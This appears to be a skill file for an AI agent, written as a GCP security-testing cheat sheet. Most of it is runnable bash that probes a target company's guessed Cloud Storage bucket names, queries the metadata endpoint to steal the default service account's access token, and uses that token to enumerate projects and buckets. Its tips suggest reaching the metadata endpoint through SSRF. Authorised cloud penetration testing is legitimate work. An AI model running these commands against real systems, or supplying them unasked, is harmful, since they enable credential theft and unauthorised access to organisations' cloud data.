---
name: gcp-security
description: GCP cloud security testing covering Storage buckets, metadata endpoint, service account key theft, and Cloud Function exploitation
---

# GCP Security Testing

## Key Vulnerabilities

### GCS Bucket Misconfiguration

```bash
for bucket in TARGET TARGET-prod TARGET-dev TARGET-assets TARGET-backup; do
  curl -sk "https://storage.googleapis.com/$bucket/" | grep -i "listbucket" && echo "[VULN] $bucket public!"
  gsutil ls gs://$bucket 2>/dev/null && echo "[VULN] $bucket accessible!"
done
```

### GCP Metadata Endpoint

```bash
# GCP metadata (requires Metadata-Flavor header)
curl -s -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/"
curl -s -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
curl -s -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/project/project-id"
curl -s -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/attributes/"
```

### Service Account Key Theft

```bash
# Access token from metadata → enumerate GCP resources
TOKEN=$(curl -s -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" | jq -r .access_token)
curl -s -H "Authorization: Bearer $TOKEN" "https://cloudresourcemanager.googleapis.com/v1/projects"
curl -s -H "Authorization: Bearer $TOKEN" "https://storage.googleapis.com/storage/v1/b?project=PROJECT_ID"
```

## Pro Tips

1. GCP metadata requires `Metadata-Flavor: Google` header — test if SSRF can set custom headers
2. `http://metadata.google.internal` is the GCP IMDS endpoint — use in SSRF testing
3. Service account tokens from metadata have whatever permissions the VM's service account has
4. GCS bucket names are globally unique — TARGET company name variations are good guesses
